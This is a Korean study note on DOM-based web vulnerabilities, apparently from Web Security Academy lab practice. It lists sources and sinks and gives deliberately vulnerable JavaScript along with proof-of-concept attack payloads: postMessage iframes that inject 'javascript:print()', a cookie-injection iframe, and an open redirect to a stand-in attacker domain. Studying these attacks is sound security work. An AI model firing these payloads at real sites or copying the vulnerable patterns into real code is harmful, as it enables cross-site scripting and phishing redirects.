## DOM 기반 취약점

#### DOM

DOM(Document Object Model, 문서 객체 모델)은 브라우저가 HTML 문서를 이해할 수 있도록 페이지의 요소들을 노드 트리 구조로 표현한 것임. JavaScript를 사용하여 DOM의 노드와 객체, 속성을 조작할 수 있음. 

#### 오염 흐름

DOM 기반 취약점은 서버가 아니라 **브라우저에서 실행되는 JavaScript** 때문에 발생함.

브라우저에서 JS가 다음과 같이 처리하면 DOM 기반 취약점 발생함.
1. 공격자가 조작할 수 있는 값(URL, 해시, 쿠키, referrer, postMessage 등)을 읽고
2. 그 값을 위험한 함수나 DOM 속성에 넣고
3. 그 위험한 곳이 그 값을 안전하지 않게 처리

**소스(Source)**: 공격자가 제어할 수 있는 데이터가 들어오는 입구 

- `location.search`: `?q=...` 쿼리 문자열
- `location.hash`: `#...` URL 조각
- `document.URL`
- `document.documentURI`
- `document.URLUnencoded`
- `document.baseURI`
- `document.cookie`
- `document.referrer`: 이전 페이지 URL
- `window.name`
- localStorage
- sessionStorage
- IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
- Database

**싱크(Sink)**: 그 데이터가 들어갔을 때 취약점이 될 수 있는 함수나 DOM 객체

- `eval()`: 문자열을 JavaScript 코드로 실행
- `document.body.innerHTML`: 문자열을 HTML로 해석
- `document.write()`: HTML 삽입
- `location = ...`, `location.href = ...`: 다른 URL로 이동
- `window.open()`: 새 창/리다이렉트
- `element.src`, `form.action` 등

| DOM 기반 취약점       | 예시 싱크                      |
| ---------------- | -------------------------- |
| DOM 기반 XSS       | `document.write()`         |
| 오픈 리다이렉션          | `window.location`          |
| 쿠키 조작            | `document.cookie`          |
| 자바스크립트 주입        | `eval()`                   |
| 문서 영역 조작         | `document.domain`          |
| 웹소켓 URL 포이즌닝     | `WebSocket()`              |
| 링크 조작            | `element.src`              |
| 웹 메시지 조작         | `postMessage()`            |
| Ajax 요청 헤더 조작    | `setRequestHeader()`       |
| 로컬 파일 경로 조작      | `FileReader.readAsText()`  |
| 클라이언트 측 SQL 인젝션  | `ExecuteSql()`             |
| HTML5 저장소 조작     | `sessionStorage.setItem()` |
| 클라이언트 측 XPath 주입 | `document.evaluate()`      |
| 클라이언트 측 JSON 주입  | `JSON.parse()`             |
| DOM 데이터 조작       | `element.setAttribute()`   |
| 서비스 거부           | `RegExp()`                 |


### DOM 기반 XSS

[[01-XSS#DOM 기반 XSS]]


### 웹 메시지

웹 메시지는 서로 다른 출처(origin)의 **창, 탭, iframe 간에** 안전하게 데이터를 주고받을 수 있도록 HTML5에서 도입된 표준 API

``` js
targetWindow.postMessage(message, targetOrigin);
```
- `targetWindow`: 메세지를 보낼 브라우저 창 객체
	- 예: `iframe.contentWindow.postMessage(...)`, `popupWindow.postMessage(...)`, `window.parent.postMessage(...)`
- `targetOrigin`: 보내는 쪽의 브라우저가 메시지를 받을 브라우저의 출처를 검사 (`*` 사용 가능)

예시: `example.com`에서 `other.com`으로 메시지를 전송하는 경우

- `example.com`이 `ohter.com`을 iframe으로 띄운 상황
``` html 
<!-- example.com 페이지 -->
<iframe id="f" src="https://other.com/widget"></iframe>
<script>
  const f = document.getElementById('f');
  f.onload = () => {
    f.contentWindow.postMessage({ type: "hello" }, "https://other.com");
  };
</script>
```

``` js
// other.com/widget 페이지
window.addEventListener("message", (e) => {
  if (e.origin !== "https://example.com") return; // 발신자 검증
  console.log(e.data); // { type: "hello" }
});
```
- `e.origin`은 `example.com`에서 보낼때 설정하는 `targetOrigin`과는 다름. 브라우저가 자동으로 메세지를 전송하는 출처를 설정해줌. 

#### 취약점

웹 메세지의 출처를 검사하지 않거나 검사를 하더라도 우회가 가능한 경우 공격자의 서버에서 악성 웹 메시지를 보낼 수 있음. 
공격자가 제어할 수 있는 데이터를 `eval()`로 실행한다거나 하는 코드가 있으면 XSS가 발생함. 

``` html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

공격 스크립트 
``` html
<!-- 해커의 페이지 -->
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```


**프로토콜 검증 우회**

``` html
<script>
	window.addEventListener('message', function(e) {
		var url = e.data;
		if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
			location.href = url;
		}
    }, false);
</script>
```

``` html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
```


**JSON을 주고 받는 경우**
- `onload` 사용
``` html
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ 
        onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

- `setTimeout` 사용
``` html
<iframe id="f" src="https://0acc00d0037b9d8180688a9600440065.web-security-academy.net/" width="1000" height="1000"></iframe>
<script>
  document.getElementById('f').onload = function() {
    setTimeout(() => {
      this.contentWindow.postMessage(
        JSON.stringify({
          type: "load-channel",
          url: "javascript:print()"
        }),
        "*"
      );
    }, 500);
  };
</script>
```


### 오픈 리다이렉션

브라우저의 JavaScript에 의해 공격자가 지정한 외부 악성 사이트로 사용자를 리다이렉션 시키도록 하는 취약점
유효한 도메인과 안전한 HTTPS를 사용하기 때문에 취약점 공격 시 피해자에게 신뢰성을 줌. 

**조건** 
1. **소스(Source)**: 공격자가 제어할 수 있는 데이터가 들어옴 (예: `location.hash`)
2. **싱크(Sink)**: 그 데이터가 위험한 곳으로 전달됨 
	- 예: `location = ...`, `window.location.href = ...`
3. **검증 부재**: 소스에서 싱크로 가는 과정에서 이 URL이 우리 사이트인지, 신뢰할 수 있는 곳인지 검사하지 않음


**예시**
``` js
goto = location.hash.slice(1)
if (goto.startsWith('https:')) {
  location = goto;
}
```

공격 스크립트 
``` url 
https://www.innocent-website.com/example#https://www.evil-user.net
```
- 피해자가 이 링크를 누른 경우 `https://www.evil-user.net`로 이동시킴. 

**영향**
1. 악성 사이트로 리다이렉션 시킬 수 있음. 
2. XSS: `javascript:`로 자바스크립트를 실행할 수 있음. 
	- 예: `location = javascript:...`


### 쿠키 조작

DOM 기반 쿠키 조작은 공격자가 제어할 수 있는 데이터를 쿠키의 값에 기록하는 경우 발생함. 

**예시**
`/product` 페이지에서 경로가 쿠키로 지정되고 해당 쿠키 값을 화면에 출력하는 경우 
``` html
<script>
	document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

공격 스크립트 
``` html
<iframe src="https://target.com/product?productId=1&'><script>print()</script>" 
onload="if(!window.x)this.src='https://target.com';window.x=1;">
```
- `<iframe>`으로 쿠키를 지정하는 URL로 악성 스크립트를 쿠키로 지정
- `onload` 이벤트로 페이지가 로드되면 (쿠키가 지정되면) 새로운 화면을 보여으로써 그 화면에 출력된 악성 스크립트가 실행됨. 


### JavaScript 삽입

DOM 기반 JavaScript 삽입은 공격자가 제어할 수 있는 데이터를 JavaScript로 실행하는 경우 발생함. 

**예시**

- `eval()`
``` js
// URL의 해시(#) 부분을 읽어옵니다. (예: #alert(1))
let code = location.hash.slice(1); // '#alert(1)'에서 '#'을 떼어냄

// 사용자가 입력한 값을 그대로 eval()로 실행합니다.
if (code) {
  eval(code);
}
```

- `setTimeout()`
``` js
// URL 쿼리 스트링에서 'callback' 파라미터를 읽어옵니다.
// 예: ?callback=alert(1)
let callback = new URLSearchParams(location.search).get('callback');

// setTimeout의 첫 번째 인자로 문자열을 전달하면, 그 문자열을 코드로 실행합니다.
if (callback) {
  setTimeout(callback, 1000); // 1초 뒤에 실행
}
```


### `document.domain` 조작

공격자가 제어하는 데이터를 사용하여 `document.domain` 속성을 설정할 때 발생함. 
공격자가 자신의 사이트와 타겟 사이트의 `document.domain`을 동일하게 설정하면 동일 출처 정책 SOP를 우회해서 타겟 사이트의 요소에 접근할 수 있음. 

**현대 브라우저 대부분은 `document.domain` 속성의 설정 기능이 완전히 비활성화 됨.** 


### 웹소켓 URL 조작

DOM 기반 웹소켓 URL 조작은 공격자가 제어할 수 있는 데이터가 웹소켓 연결 대상 URL로 들어가는 경우 발생함. 
공격자는 자신의 서버와 웹소켓을 연결하고 타겟 사이트의 민감한 데이터를 받거나 서버의 데이터로 타겟 사이트를 조작할 수 있음. 

**예시**
``` js
// URL 해시에서 값을 읽어옴 (공격자 제어 가능)
let wsUrl = location.hash.slice(1);

// 그 값을 그대로 WebSocket 연결 주소로 사용
let socket = new WebSocket(wsUrl);
```


### 링크 조작

DOM 기반 링크 조작은 공격자가 사용자가 클릭할 링크나 폼 전송 주소를 공격자가 원하는 데이터로 바꾸는 경우를 말함. 

1. `element.href` 조작: 링크의 주소를 바꿈. 
	- 상황: 사용자 프로필 페이지에 내 정보 보기라는 링크 주소는 URL의 해시(`#`) 값에 따라 동적으로 바뀜.
``` js
// URL의 해시 값을 읽어서 링크의 href에 넣음
let targetUrl = location.hash.slice(1);
document.getElementById("profileLink").href = targetUrl;
```

2. `element.action` 조작: `<form>` 태그의 전송 주소를 바꿈.
``` js
// 쿼리 스트링에서 'redirect' 값을 읽어서 폼 전송 주소로 설정
let redirectUrl = new URLSearchParams(location.search).get("redirect");
document.getElementById("loginForm").action = redirectUrl;
```

3. `element.src` 조작: `<script>`, `<img>`, `<iframe>` 등의 리소스 주소를 바꿈.
	- 공격자의 서버로 이미지를 요청하도록 할 수 있음.
	- `src`에 `javascript:`를 넣으면 XSS가 터질 수 있음.


